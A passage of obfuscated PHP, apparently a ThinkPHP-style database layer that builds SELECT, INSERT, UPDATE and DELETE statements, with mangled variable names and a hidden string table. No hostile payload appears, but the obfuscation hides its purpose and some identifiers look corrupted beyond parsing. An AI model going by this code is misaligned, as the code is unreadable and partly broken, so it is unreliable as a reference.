$ÀİÔÛÆÚ; } function parseKeyCheck($õ”‰£´) { $šçüæ‡ì =& $_SERVER[åÄ¼Ùßš]; $õ”‰£´ = trim($õ”‰£´); if (!preg_match($šçüæ‡ì[1104], $õ”‰£´)) { think_exception($šçüæ‡ì[1105] . $õ”‰£´); } return $õ”‰£´; } protected function parseValue($¡òÄ¬ãÊ) { $İª˜Äùğ =& $_SERVER[åÄ¼Ùßš]; if (is_string($¡òÄ¬ãÊ)) { $¡òÄ¬ãÊ = $İª˜Äùğ[1065] . $this->escapeString($¡òÄ¬ãÊ) . $İª˜Äùğ[1065]; } elseif (isset($¡òÄ¬ãÊ[0]) && is_string($¡òÄ¬ãÊ[0]) && strtolower($¡òÄ¬ãÊ[0]) == $İª˜Äùğ[374]) { $¡òÄ¬ãÊ = $this->escapeString($¡òÄ¬ãÊ[1]); } elseif (is_array($¡òÄ¬ãÊ)) { $¡òÄ¬ãÊ = array_map(array($this, $İª˜Äùğ[1066]), $¡òÄ¬ãÊ); } elseif (is_bool($¡òÄ¬ãÊ)) { $¡òÄ¬ãÊ = $¡òÄ¬ãÊ ? $İª˜Äùğ[91] : $İª˜Äùğ[231]; } elseif (is_null($¡òÄ¬ãÊ)) { $¡òÄ¬ãÊ = $İª˜Äùğ[106]; } return $¡òÄ¬ãÊ; } protected function parseField($ÚüÕÇ©™) { $ÈäãÕØ€ =& $_SERVER[åÄ¼Ùßš]; if (is_string($ÚüÕÇ©™) && strpos($ÚüÕÇ©™, $ÈäãÕØ€[50])) { $ÚüÕÇ©™ = explode($ÈäãÕØ€[50], $ÚüÕÇ©™); } if (is_array($ÚüÕÇ©™)) { $ÄÎ»ˆŞë = array(); foreach ($ÚüÕÇ©™ as $ï»˜—È€ => $¯§º¦Î…) { if (!is_numeric($ï»˜—È€)) { $ÄÎ»ˆŞë[] = $this->parseKey($ï»˜—È€, !1) . $ÈäãÕØ€[1106] . $this->parseKey($¯§º¦Î…); } else { $ÄÎ»ˆŞë[] = $this->parseKey($¯§º¦Î…); } } $®±Û‡áÊ = implode($ÈäãÕØ€[50], $ÄÎ»ˆŞë); } elseif (is_string($ÚüÕÇ©™) && !empty($ÚüÕÇ©™)) { $®±Û‡áÊ = $ÚüÕÇ©™; } else { $®±Û‡áÊ = $ÈäãÕØ€[223]; } return $®±Û‡áÊ; } protected function parseTable($¯‰Æ«å³) { $šû¿Íù¹ =& $_SERVER[åÄ¼Ùßš]; if (is_array($¯‰Æ«å³)) { $ĞšŠÕ€ä = array(); foreach ($¯‰Æ«å³ as $È¢şİá => $½©Ãš â) { if (!is_numeric($È¢şİá)) { $ĞšŠÕ€ä[] = $this->parseKey($È¢şİá) . $šû¿Íù¹[53] . $this->parseKey($½©Ãš â); } else { $ĞšŠÕ€ä[] = $this->parseKey($È¢şİá); } } $¯‰Æ«å³ = $ĞšŠÕ€ä; } elseif (is_string($¯‰Æ«å³)) { if (strstr($¯‰Æ«å³, $šû¿Íù¹[53])) { return $¯‰Æ«å³; } $¯‰Æ«å³ = explode($šû¿Íù¹[50], $¯‰Æ«å³); array_walk($¯‰Æ«å³, array($this, $šû¿Íù¹[1011])); } return $šû¿Íù¹[1005] . trim(implode($šû¿Íù¹[1107], $¯‰Æ«å³), $šû¿Íù¹[473]) . $šû¿Íù¹[1005]; } protected function parseWhere($Îğ”öí€) { $¸ª ¢ŒÁ =& $_SERVER[åÄ¼Ùßš]; $Ç¤ùó†î = $¸ª ¢ŒÁ[12]; if (is_string($Îğ”öí€)) { $Ç¤ùó†î = $Îğ”öí€; } else { $»À˜ïªö = isset($Îğ”öí€[$¸ª ¢ŒÁ[1108]]) ? strtoupper($Îğ”öí€[$¸ª ¢ŒÁ[1108]]) : $¸ª ¢ŒÁ[12]; if (in_array($»À˜ïªö, array($¸ª ¢ŒÁ[1109], $¸ª ¢ŒÁ[1110], $¸ª ¢ŒÁ[1111]))) { $»À˜ïªö = $¸ª ¢ŒÁ[53] . $»À˜ïªö . $¸ª ¢ŒÁ[53]; unset($Îğ”öí€[$¸ª ¢ŒÁ[1108]]); } else { $»À˜ïªö = $¸ª ¢ŒÁ[1112]; } foreach ($Îğ”öí€ as $¦Î”ƒ¯¿ => $×áÖÇµ) { $Ç¤ùó†î .= $¸ª ¢ŒÁ[357]; if (is_numeric($¦Î”ƒ¯¿)) { $¦Î”ƒ¯¿ = $¸ª ¢ŒÁ[1113]; } if (0 === strpos($¦Î”ƒ¯¿, $¸ª ¢ŒÁ[11])) { $Ç¤ùó†î .= $this->parseThinkWhere($¦Î”ƒ¯¿, $×áÖÇµ); } else { if (!preg_match($¸ª ¢ŒÁ[1114], trim($¦Î”ƒ¯¿))) { think_exception(think_lang($¸ª ¢ŒÁ[1115]) . $¸ª ¢ŒÁ[4] . $¦Î”ƒ¯¿); } $®âüÙºÊ = is_array($×áÖÇµ) && isset($×áÖÇµ[$¸ª ¢ŒÁ[1116]]); $¦Î”ƒ¯¿ = trim($¦Î”ƒ¯¿); if (strpos($¦Î”ƒ¯¿, $¸ª ¢ŒÁ[215])) { $÷—„È„® = explode($¸ª ¢ŒÁ[215], $¦Î”ƒ¯¿); $ç­¸¨Ø = array(); foreach ($÷—„È„® as $•“›ç§Î => $Àİø‡§) { $óŞù¨ûÚ = $®âüÙºÊ ? $×áÖÇµ[$•“›ç§Î] : $×áÖÇµ; $ç­¸¨Ø[] = $¸ª ¢ŒÁ[340] . $this->parseWhereItem($this->parseKey($Àİø‡§), $óŞù¨ûÚ) . $¸ª ¢ŒÁ[1010]; } $Ç¤ùó†î .= implode($¸ª ¢ŒÁ[1117], $ç­¸¨Ø); } elseif (strpos($¦Î”ƒ¯¿, $¸ª ¢ŒÁ[287])) { $÷—„È„® = explode($¸ª ¢ŒÁ[287], $¦Î”ƒ¯¿); $ç­¸¨Ø = array(); foreach ($÷—„È„® as $•“›ç§Î => $Àİø‡§) { $óŞù¨ûÚ = $®âüÙºÊ ? $×áÖÇµ[$•“›ç§Î] : $×áÖÇµ; $ç­¸¨Ø[] = $¸ª ¢ŒÁ[340] . $this->parseWhereItem($this->parseKey($Àİø‡§), $óŞù¨ûÚ) . $¸ª ¢ŒÁ[1010]; } $Ç¤ùó†î .= implode($¸ª ¢ŒÁ[1112], $ç­¸¨Ø); } else { $Ç¤ùó†î .= $this->parseWhereItem($this->parseKey($¦Î”ƒ¯¿), $×áÖÇµ); } } $Ç¤ùó†î .= $¸ª ¢ŒÁ[358] . $»À˜ïªö; } $Ç¤ùó†î = substr($Ç¤ùó†î, 0, -strlen($»À˜ïªö)); } return empty($Ç¤ùó†î) ? $¸ª ¢ŒÁ[12] : $¸ª ¢ŒÁ[1118] . $Ç¤ùó†î; } protected function parseWhereItem($ûâ²ïÔš, $«ş´®ŒÎ) { $…¬èéÂ» =& $_SERVER[åÄ¼Ùßš]; $»ÁŞğÌæ = $…¬èéÂ»[12]; if (is_array($«ş´®ŒÎ)) { if (is_string($«ş´®ŒÎ[0])) { $ìÖØÖ§ = strtolower($«ş´®ŒÎ[0]); if (in_array($«ş´®ŒÎ[0], array($…¬èéÂ»[465], $…¬èéÂ»[1119], $…¬èéÂ»[1120], $…¬èéÂ»[1121], $…¬èéÂ»[1122], $…¬èéÂ»[1123]))) { $»ÁŞğÌæ .= $ûâ²ïÔš . $…¬èéÂ»[53] . $«ş´®ŒÎ[0] . $…¬èéÂ»[53] . $this->parseValue($«ş´®ŒÎ[1]); } elseif (preg_match($…¬èéÂ»[1124], $«ş´®ŒÎ[0])) { $»ÁŞğÌæ .= $ûâ²ïÔš . $…¬èéÂ»[53] . $this->exp[$ìÖØÖ§] . $…¬èéÂ»[53] . $this->parseValue($«ş´®ŒÎ[1]); } elseif (preg_match($…¬èéÂ»[1125], $«ş´®ŒÎ[0])) { if (is_array($«ş´®ŒÎ[1])) { $§ê÷øã = isset($«ş´®ŒÎ[2]) ? strtoupper($«ş´®ŒÎ[2]) : $…¬èéÂ»[1110]; if (in_array($§ê÷øã, array($…¬èéÂ»[1109], $…¬èéÂ»[1110], $…¬èéÂ»[1111]))) { $®µœæ“Š = array(); foreach ($«ş´®ŒÎ[1] as $¬åôâûô) { $®µœæ“Š[] = $ûâ²ïÔš . $…¬èéÂ»[53] . $this->exp[$ìÖØÖ§] . $…¬èéÂ»[53] . $this->parseValue($¬åôâûô); } $»ÁŞğÌæ .= $…¬èéÂ»[340] . implode($…¬èéÂ»[53] . $§ê÷øã . $…¬èéÂ»[53], $®µœæ“Š) . $…¬èéÂ»[1010]; } } else { $»ÁŞğÌæ .= $ûâ²ïÔš . $…¬èéÂ»[53] . $this->exp[$ìÖØÖ§] . $…¬èéÂ»[53] . $this->parseValue($«ş´®ŒÎ[1]); } } elseif ($…¬èéÂ»[374] == $ìÖØÖ§) { $»ÁŞğÌæ .= $…¬èéÂ»[1008] . $ûâ²ïÔš . $…¬èéÂ»[53] . $«ş´®ŒÎ[1] . $…¬èéÂ»[1126]; } elseif (preg_match($…¬èéÂ»[1127], $«ş´®ŒÎ[0])) { $»ÁŞğÌæ .= $«ş´®ŒÎ[0]; } elseif (preg_match($…¬èéÂ»[1128], $«ş´®ŒÎ[0])) { if (isset($«ş´®ŒÎ[2]) && $…¬èéÂ»[374] == $«ş´®ŒÎ[2]) { $»ÁŞğÌæ .= $ûâ²ïÔš . $…¬èéÂ»[53] . $this->exp[$ìÖØÖ§] . $…¬èéÂ»[53] . $«ş´®ŒÎ[1]; } else { if (is_string($«ş´®ŒÎ[1])) { $«ş´®ŒÎ[1] = explode($…¬èéÂ»[50], $«ş´®ŒÎ[1]); } $óõ¤ƒ›¸ = implode($…¬èéÂ»[50], $this->parseValue($«ş´®ŒÎ[1])); $»ÁŞğÌæ .= $ûâ²ïÔš . $…¬èéÂ»[53] . $this->exp[$ìÖØÖ§] . $…¬èéÂ»[1008] . $óõ¤ƒ›¸ . $…¬èéÂ»[1010]; } } elseif (preg_match($…¬èéÂ»[1129], $«ş´®ŒÎ[0])) { $„ĞıéÏ¸ = is_string($«ş´®ŒÎ[1]) ? explode($…¬èéÂ»[50], $«ş´®ŒÎ[1]) : $«ş´®ŒÎ[1]; $»ÁŞğÌæ .= $…¬èéÂ»[1008] . $ûâ²ïÔš . $…¬èéÂ»[53] . $this->exp[$ìÖØÖ§] . $…¬èéÂ»[53] . $this->parseValue($„ĞıéÏ¸[0]) . $…¬èéÂ»[1112] . $this->parseValue($„ĞıéÏ¸[1]) . $…¬èéÂ»[358]; } else { think_exception(think_lang($…¬èéÂ»[1115]) . $…¬èéÂ»[4] . $«ş´®ŒÎ[0]); } } else { $ÜÇÎ·å = count($«ş´®ŒÎ); $îÃâı÷ = $…¬èéÂ»[12]; if (is_string($«ş´®ŒÎ[$ÜÇÎ·å - 1])) { $îÃâı÷ = isset($«ş´®ŒÎ[$ÜÇÎ·å - 1]) ? strtoupper($«ş´®ŒÎ[$ÜÇÎ·å - 1]) : $…¬èéÂ»[12]; if (in_array($îÃâı÷, array($…¬èéÂ»[1109], $…¬èéÂ»[1110], $…¬èéÂ»[1111]))) { $ÜÇÎ·å = $ÜÇÎ·å - 1; } } else { $îÃâı÷ = $…¬èéÂ»[1109]; } for ($ääà·üÕ = 0; $ääà·üÕ < $ÜÇÎ·å; $ääà·üÕ++) { $„ĞıéÏ¸ = is_array($«ş´®ŒÎ[$ääà·üÕ]) ? $«ş´®ŒÎ[$ääà·üÕ][1] : $«ş´®ŒÎ[$ääà·üÕ]; if ($…¬èéÂ»[374] == strtolower($«ş´®ŒÎ[$ääà·üÕ][0])) { $»ÁŞğÌæ .= $…¬èéÂ»[340] . $ûâ²ïÔš . $…¬èéÂ»[53] . $„ĞıéÏ¸ . $…¬èéÂ»[1126] . $îÃâı÷ . $…¬èéÂ»[53]; } else { $–€Ş âÍ = is_array($«ş´®ŒÎ[$ääà·üÕ]) ? $this->exp[strtolower($«ş´®ŒÎ[$ääà·üÕ][0])] : $…¬èéÂ»[465]; if (!$–€Ş âÍ && is_array($«ş´®ŒÎ[$ääà·üÕ]) && in_array($«ş´®ŒÎ[$ääà·üÕ][0], array($…¬èéÂ»[465], $…¬èéÂ»[1119], $…¬èéÂ»[1120], $…¬èéÂ»[1121], $…¬èéÂ»[1122], $…¬èéÂ»[1123]))) { $–€Ş âÍ = $«ş´®ŒÎ[$ääà·üÕ][0]; } $»ÁŞğÌæ .= $…¬èéÂ»[340] . $ûâ²ïÔš . $…¬èéÂ»[53] . $–€Ş âÍ . $…¬èéÂ»[53] . $this->parseValue($„ĞıéÏ¸) . $…¬èéÂ»[1126] . $îÃâı÷ . $…¬èéÂ»[53]; } } $»ÁŞğÌæ = substr($»ÁŞğÌæ, 0, -4); } } else { $»ÁŞğÌæ .= $ûâ²ïÔš . $…¬èéÂ»[1130] . $this->parseValue($«ş´®ŒÎ); } return $»ÁŞğÌæ; } protected function parseThinkWhere($•õî•·², $•›îí‚â) { $Ğ´Î‚¥— =& $_SERVER[åÄ¼Ùßš]; $ãâåæ¬ä = $Ğ´Î‚¥—[12]; switch ($•õî•·²) { case $Ğ´Î‚¥—[429]: $ãâåæ¬ä = $•›îí‚â; break; case $Ğ´Î‚¥—[1113]: $ãâåæ¬ä = is_string($•›îí‚â) ? $•›îí‚â : substr($this->parseWhere($•›îí‚â), 6); break; case $Ğ´Î‚¥—[1131]: parse_str($•›îí‚â, $“–…‹´ù); if (isset($“–…‹´ù[$Ğ´Î‚¥—[1108]])) { $—–ÍëË“ = $Ğ´Î‚¥—[53] . strtoupper($“–…‹´ù[$Ğ´Î‚¥—[1108]]) . $Ğ´Î‚¥—[53]; unset($“–…‹´ù[$Ğ´Î‚¥—[1108]]); } else { $—–ÍëË“ = $Ğ´Î‚¥—[1112]; } $Êì¢Íí„ = array(); foreach ($“–…‹´ù as $ä¦‘®¸× => $Ş™¨¡ı‘) { $Êì¢Íí„[] = $this->parseKey($ä¦‘®¸×) . $Ğ´Î‚¥—[1130] . $this->parseValue($Ş™¨¡ı‘); } $ãâåæ¬ä = implode($—–ÍëË“, $Êì¢Íí„); break; } return $ãâåæ¬ä; } protected function parseLimit($ Èäô¤) { $¸ú½ã‰” =& $_SERVER[åÄ¼Ùßš]; return !empty($ Èäô¤) ? $¸ú½ã‰”[51] . $ Èäô¤ . $¸ú½ã‰”[53] : $¸ú½ã‰”[12]; } protected function parseJoin($øú—œô§) { $£áœŞ˜È =& $_SERVER[åÄ¼Ùßš]; $Íó’îÖ¨ = $£áœŞ˜È[12]; if (!empty($øú—œô§)) { if (is_array($øú—œô§)) { foreach ($øú—œô§ as $Œ¿½ƒ§Ó => $Æßà˜´ö) { if (!1 !== stripos($Æßà˜´ö, $£áœŞ˜È[1132])) { $Íó’îÖ¨ .= $£áœŞ˜È[53] . $Æßà˜´ö; } else { $Íó’îÖ¨ .= $£áœŞ˜È[1133] . $Æßà˜´ö; } } } else { $Íó’îÖ¨ .= $£áœŞ˜È[1133] . $øú—œô§; } } $Íó’îÖ¨ = preg_replace($£áœŞ˜È[1134], think_config($£áœŞ˜È[1038]) . $£áœŞ˜È[1135], $Íó’îÖ¨); return $Íó’îÖ¨; } protected function parseOrder($Á”ì½Éú) { $ú¯˜«™ =& $_SERVER[åÄ¼Ùßš]; if (is_array($Á”ì½Éú)) { $×ñ˜…° = array(); foreach ($Á”ì½Éú as $çˆôÅ«„ => $ÀˆÇÊŸ®) { if (is_numeric($çˆôÅ«„)) { $×ñ˜…°[] = $this->parseKey($ÀˆÇÊŸ®); } else { $ÀˆÇÊŸ® = in_array(strtoupper(trim($ÀˆÇÊŸ®)), array($ú¯˜«™[1136], $ú¯˜«™[1137])) ? $ú¯˜«™[53] . $ÀˆÇÊŸ® : $ú¯˜«™[12]; if (preg_match($ú¯˜«™[1138], $çˆôÅ«„)) { $×ñ˜…°[] = $this->parseKey($çˆôÅ«„) . $ÀˆÇÊŸ®; } else { think_exception($ú¯˜«™[1139] . $çˆôÅ«„); } } } $Á”ì½Éú = implode($ú¯˜«™[50], $×ñ˜…°); } return !empty($Á”ì½Éú) ? $ú¯˜«™[1140] . $Á”ì½Éú : $ú¯˜«™[12]; } protected function parseGroup($×Ú±×‘Ô) { $¨“ñÙ‘ô =& $_SERVER[åÄ¼Ùßš]; return !empty($×Ú±×‘Ô) ? $¨“ñÙ‘ô[1141] . $×Ú±×‘Ô : $¨“ñÙ‘ô[12]; } protected function parseHaving($ä½÷¯öï) { $æÀŒåÑú =& $_SERVER[åÄ¼Ùßš]; return !empty($ä½÷¯öï) ? $æÀŒåÑú[1142] . $ä½÷¯öï : $æÀŒåÑú[12]; } protected function parseComment($Æ¹ÂªœÓ) { $Èğú¾ªÊ =& $_SERVER[åÄ¼Ùßš]; return !empty($Æ¹ÂªœÓ) ? $Èğú¾ªÊ[1143] . $Æ¹ÂªœÓ . $Èğú¾ªÊ[1144] : $Èğú¾ªÊ[12]; } protected function parseDistinct($ÚÍ¢ªË) { $Ï‹•‡ÖÇ =& $_SERVER[åÄ¼Ùßš]; return !empty($ÚÍ¢ªË) ? $Ï‹•‡ÖÇ[1145] : $Ï‹•‡ÖÇ[12]; } protected function parseUnion($íËµ†¶) { $ÚÃÖÖ„ =& $_SERVER[åÄ¼Ùßš]; if (empty($íËµ†¶)) { return $ÚÃÖÖ„[12]; } if (isset($íËµ†¶[$ÚÃÖÖ„[425]])) { $íØëÃŒñ = $ÚÃÖÖ„[1146]; unset($íËµ†¶[$ÚÃÖÖ„[425]]); } else { $íØëÃŒñ = $ÚÃÖÖ„[1147]; } foreach ($íËµ†¶ as $òÌúş†Û) { $ª²•¤Êê[] = $íØëÃŒñ . (is_array($òÌúş†Û) ? $this->buildSelectSql($òÌúş†Û) : $òÌúş†Û); } return implode($ÚÃÖÖ„[53], $ª²•¤Êê); } public function insert($¦ßÖ÷È, $¨•½©¾ = array(), $²é÷Ë„Ê = false) { $À˜ÀĞª˜ =& $_SERVER[åÄ¼Ùßš]; $¢ü®éÖÎ = $á«˜Í–— = array(); $this->model = $¨•½©¾[$À˜ÀĞª˜[361]]; foreach ($¦ßÖ÷È as $ÛÏŒÓç => $‘é†¿) { if (is_array($‘é†¿) && $À˜ÀĞª˜[374] == $‘é†¿[0]) { $á«˜Í–—[] = $this->parseKey($ÛÏŒÓç); $¢ü®éÖÎ[] = $‘é†¿[1]; } elseif (is_scalar($‘é†¿) || is_null($‘é†¿)) { $á«˜Í–—[] = $this->parseKey($ÛÏŒÓç); $¢ü®éÖÎ[] = $this->parseValue($‘é†¿); } } $‘œùË¦Í = ($²é÷Ë„Ê ? $À˜ÀĞª˜[1012] : $À˜ÀĞª˜[1013]) . $À˜ÀĞª˜[1014] . $this->parseTable($¨•½©¾[$À˜ÀĞª˜[359]]) . $À˜ÀĞª˜[1008] . implode($À˜ÀĞª˜[50], $á«˜Í–—) . $À˜ÀĞª˜[1009] . implode($À˜ÀĞª˜[50], $¢ü®éÖÎ) . $À˜ÀĞª˜[1010]; $‘œùË¦Í .= $this->parseLock(isset($¨•½©¾[$À˜ÀĞª˜[948]]) ? $¨•½©¾[$À˜ÀĞª˜[948]] : !1); $‘œùË¦Í .= $this->parseComment(!empty($¨•½©¾[$À˜ÀĞª˜[431]]) ? $¨•½©¾[$À˜ÀĞª˜[431]] : $À˜ÀĞª˜[12]); return $this->execute($‘œùË¦Í, $this->parseBind(!empty($¨•½©¾[$À˜ÀĞª˜[363]]) ? $¨•½©¾[$À˜ÀĞª˜[363]] : array())); } public function selectInsert($òÍÎ‘ùã, $¤¤Ù’ÇÑ, $æäÚû¼ = array()) { $ÕåÊ‘¨å =& $_SERVER[åÄ¼Ùßš]; $this->model = $æäÚû¼[$ÕåÊ‘¨å[361]]; if (is_string($òÍÎ‘ùã)) { $òÍÎ‘ùã = explode($ÕåÊ‘¨å[50], $òÍÎ‘ùã); } array_walk($òÍÎ‘ùã, array($this, $ÕåÊ‘¨å[1011])); $â™ë÷Ğô = $ÕåÊ‘¨å[1148] . $this->parseTable($¤¤Ù’ÇÑ) . $ÕåÊ‘¨å[1008] . implode($ÕåÊ‘¨å[50], $òÍÎ‘ùã) . $ÕåÊ‘¨å[1126]; $â™ë÷Ğô .= $this->buildSelectSql($æäÚû¼); return $this->execute($â™ë÷Ğô, $this->parseBind(!empty($æäÚû¼[$ÕåÊ‘¨å[363]]) ? $æäÚû¼[$ÕåÊ‘¨å[363]] : array())); } public function update($®ïˆ°Š’, $“Ï‰üÁ…) { $¸áåÛ¡ =& $_SERVER[åÄ¼Ùßš]; $this->model = $“Ï‰üÁ…[$¸áåÛ¡[361]]; $É¯ºĞ© = $¸áåÛ¡[1149] . $this->parseTable($“Ï‰üÁ…[$¸áåÛ¡[359]]) . $this->parseSet($®ïˆ°Š’) . $this->parseWhere(!empty($“Ï‰üÁ…[$¸áåÛ¡[355]]) ? $“Ï‰üÁ…[$¸áåÛ¡[355]] : $¸áåÛ¡[12]) . $this->parseOrder(!empty($“Ï‰üÁ…[$¸áåÛ¡[443]]) ? $“Ï‰üÁ…[$¸áåÛ¡[443]] : $¸áåÛ¡[12]) . $this->parseLimit(!empty($“Ï‰üÁ…[$¸áåÛ¡[370]]) ? $“Ï‰üÁ…[$¸áåÛ¡[370]] : $¸áåÛ¡[12]) . $this->parseLock(isset($“Ï‰üÁ…[$¸áåÛ¡[948]]) ? $“Ï‰üÁ…[$¸áåÛ¡[948]] : !1) . $this->parseComment(!empty($“Ï‰üÁ…[$¸áåÛ¡[431]]) ? $“Ï‰üÁ…[$¸áåÛ¡[431]] : $¸áåÛ¡[12]); return $this->execute($É¯ºĞ©, $this->parseBind(!empty($“Ï‰üÁ…[$¸áåÛ¡[363]]) ? $“Ï‰üÁ…[$¸áåÛ¡[363]] : array())); } public function delete($¬½ëŒÒ = array()) { $ı–áßä =& $_SERVER[åÄ¼Ùßš]; $this->model = $¬½ëŒÒ[$ı–áßä[361]]; $ÙêæÆÙ = $ı–áßä[1150] . $this->parseTable($¬½ëŒÒ[$ı–áßä[359]]) . $this->parseWhere(!empty($¬½ëŒÒ[$ı–áßä[355]]) ? $¬½ëŒÒ[$ı–áßä[355]] : $ı–áßä[12]) . $this->parseOrder(!empty($¬½ëŒÒ[$ı–áßä[443]]) ? $¬½ëŒÒ[$ı–áßä[443]] : $ı–áßä[12]) . $this->parseLimit(!empty($¬½ëŒÒ[$ı–áßä[370]]) ? $¬½ëŒÒ[$ı–áßä[370]] : $ı–áßä[12]) . $this->parseLock(isset($¬½ëŒÒ[$ı–áßä[948]]) ? $¬½ëŒÒ[$ı–áßä[948]] : !1) . $this->parseComment(!empty($¬½ëŒÒ[$ı–áßä[431]]) ? $¬½ëŒÒ[$ı–áßä[431]] : $ı–áßä[12]); return $this->execute($ÙêæÆÙ, $this->parseBind(!empty($¬½ëŒÒ[$ı–áßä[363]]) ? $¬½ëŒÒ[$ı–áßä[363]] : array())); } public function select($ Ìß³ó = array()) { $¨±ÖÅÚ =& $_SERVER[åÄ¼Ùßš]; $this->model = $ Ìß³ó[$¨±ÖÅÚ[361]]; $®¸³»Ä« = $this->buildSelectSql($ Ìß³ó); $âÌå®Ò = isset($ Ìß³ó[$¨±ÖÅÚ[426]]) ? $ Ìß³ó[$¨±ÖÅÚ[426]] : !1; if ($âÌå®Ò) { $ÃÌÚ â› = is_string($âÌå®Ò[$¨±ÖÅÚ[97]]) ? $âÌå®Ò[$¨±ÖÅÚ[97]] : $¨±ÖÅÚ[1151] . md5($®¸³»Ä«); $îûá®² = think_cache($ÃÌÚ â›, $¨±ÖÅÚ[12], $âÌå®Ò); if (!1 !== $îûá®²) { return $îûá®²; } } $Öç×ö” = $this->query($®¸³»Ä«, $this->parseBind(!empty($ Ìß³ó[$¨±ÖÅÚ[363]]) ? $ Ìß³ó[$¨±ÖÅÚ[363]] : array())); if ($âÌå®Ò && !1 !== $Öç×ö”) { think_cache($ÃÌÚ â›, $Öç×ö”, $âÌå®Ò); } return $Öç×ö”; } public function buildSelectSql($„©ÉÕ¯Ï = array()) { $®Ğá• =& $_SERVER[åÄ¼Ùßš]; if (isset($„©ÉÕ¯Ï[$®Ğá•[430]])) { if (strpos($„©ÉÕ¯Ï[$®Ğá•[430]], $®Ğá•[50])) { list($ÍŞ›€Çì, $íæÈÛÁÎ) = explode($®Ğá•[50], $„©ÉÕ¯Ï[$®Ğá•[430]]); } else { $ÍŞ›€Çì = $„©ÉÕ¯Ï[$®Ğá•[430]]; } $ÍŞ›€Çì = $ÍŞ›€Çì ? $ÍŞ›€Çì : 1; $íæÈÛÁÎ = isset($íæÈÛÁÎ) ? $íæÈÛÁÎ : (is_numeric($„©ÉÕ¯Ï[$®Ğá•[370]]) ? $„©ÉÕ¯Ï[$®Ğá•[370]] : 20); $¸æ«Äò¤ = $íæÈÛÁÎ * ((int) $ÍŞ›€Çì - 1); $„©ÉÕ¯Ï[$®Ğá•[370]] = $¸æ«Äò¤ . $®Ğá•[50] . $íæÈÛÁÎ; } if (think_config($®Ğá•[1152])) { $Ë•Àµ¿ = $®Ğá•[1153] . md5(serialize($„©ÉÕ¯Ï)); $‡ÅèŞƒ‚ = think_cache($Ë•Àµ¿); if ($‡ÅèŞƒ‚) { return $‡ÅèŞƒ‚; } } $óÚ«ñ = $this->parseSql($this->selectSql, $„©ÉÕ¯Ï); $óÚ«ñ .= $this->parseLock(isset($„©ÉÕ¯Ï[$®Ğá•[948]]) ? $„©ÉÕ¯Ï[$®Ğá•[948]] : !1); if (isset($Ë•Àµ¿)) { think_cache($Ë•Àµ¿, $óÚ«ñ); } return $óÚ«ñ; } public function parseSql($Ö’¹»ö¿, $£Ãû¹â = array()) { $šÍÙ±Ä =& $_SERVER[åÄ¼Ùßš]; $Ö’¹»ö¿ = str_replace(array($šÍÙ±Ä[1154], $šÍÙ±Ä[1155], $šÍÙ±Ä[1156], $šÍÙ±Ä[1157], $šÍÙ±Ä[1158], $šÍÙ±Ä[1159], $šÍÙ±Ä[1160], $šÍÙ±Ä[1161], $šÍÙ±Ä[1162], $šÍÙ±Ä[1163], $šÍÙ±Ä[1164]), array($this->parseTable("{$£Ãû¹â[$šÍÙ±Ä[359]]}"), $this->parseDistinct(isset($£Ãû¹â[$šÍÙ±Ä[1165]]) ? $£Ãû¹â[$šÍÙ±Ä[1165]] : !1), $this->parseField(!empty($£Ãû¹â[$šÍÙ±Ä[353]]) ? $£Ãû¹â[$šÍÙ±Ä[353]] : $šÍÙ±Ä[223]), $this->parseJoin(!empty($£Ãû¹â[$šÍÙ±Ä[362]]) ? $£Ãû¹â[$šÍÙ±Ä[362]] : $šÍÙ±Ä[12]), $this->parseWhere(!empty($£Ãû¹â[$šÍÙ±Ä[355]]) ? $£Ãû¹â[$šÍÙ±Ä[355]] : $šÍÙ±Ä[12]), $this->parseGroup(!empty($£Ãû¹â[$šÍÙ±Ä[591]]) ? $£Ãû¹â[$šÍÙ±Ä[591]] : $šÍÙ±Ä[12]), $this->parseHaving(!empty($£Ãû¹â[$šÍÙ±Ä[1166]]) ? $£Ãû¹â[$šÍÙ±Ä[1166]] : $šÍÙ±Ä[12]), $this->parseOrder(!empty($£Ãû¹â[$šÍÙ±Ä[443]]) ? $£Ãû¹â[$šÍÙ±Ä[443]] : $šÍÙ±Ä[12]), $this->parseLimit(!empty($£Ãû¹â[$šÍÙ±Ä[370]]) ? $£Ãû¹â[$šÍÙ±Ä[370]] : $šÍÙ±Ä[12]), $this->parseUnion(!empty($£Ãû¹â[$šÍÙ±Ä[424]]) ? $£Ãû¹â[$šÍÙ±Ä[424]] : $šÍÙ±Ä[12]), $this->parseComment(!empty($£Ãû¹â[$šÍÙ±Ä[431]]) ? $£Ãû¹â[$šÍÙ±Ä[431]] : $šÍÙ±Ä[12])), $Ö’¹»ö¿); return $Ö’¹»ö¿; } public function getLastSql($é…Öô¥ = '') { return $é…Öô¥ ? $this->modelSql[$é…Öô¥] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($àÛ„Ğ–Û) { return addslashes($àÛ„Ğ–Û); } public function setModel($éÜ´Ï£à) { $this->model = $éÜ´Ï£à; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($¥¶Şö = array()) { $½ƒ„Ğñ§ =& $_SERVER[åÄ¼Ùßš]; if (empty($¥¶Şö)) { $¥¶Şö = $GLOBALS[$½ƒ„Ğñ§[6]][$½ƒ„Ğñ§[21]]; } $this->database = $¥¶Şö; } public function model($¹Ì¼ƒÂü = '') { return new ModelBase($¹Ì¼ƒÂü, $_SERVER[åÄ¼Ùßš][12], $this->database); } public function db($âÁÒöş = false) { $ÛËÑ‰€× =& $_SERVER[åÄ¼Ùßš]; $—Ó¬ı®¶ = array_change_key_case($this->database); if ($this->dbType() == $ÛËÑ‰€×[13] || !$âÁÒöş) { return $this->model()->db(); } $¸±·¤ = $—Ó¬ı®¶[$ÛËÑ‰€×[1080]]; $—Ó¬ı®¶[$ÛËÑ‰€×[1080]] = $ÛËÑ‰€×[12]; if ($—Ó¬ı®¶[$ÛËÑ‰€×[1075]] == $ÛËÑ‰€×[1072]) { $¹Ú‡§Ïé = $—Ó¬ı®¶[$ÛËÑ‰€×[1081]]; $—Ó¬ı®¶[$ÛËÑ‰€×[1081]] = substr($¹Ú‡§Ïé, 0, strrpos($¹Ú‡§Ïé, $ÛËÑ‰€×[1167])); } $this->database = $—Ó¬ı®¶; $á‡ÈÂˆÎ = $this->model()->db(); try { $ˆéìš½¢ = $á‡ÈÂˆÎ->execute("\x73\150\157\x77\40\144\141\164\x61\x62\141\163\x65\x73\x20\154\151\x6b\145\x20\47{$¸±·¤}\x27"); } catch (Exception $Øéˆ³µº) { } if (!$ˆéìš½¢) { 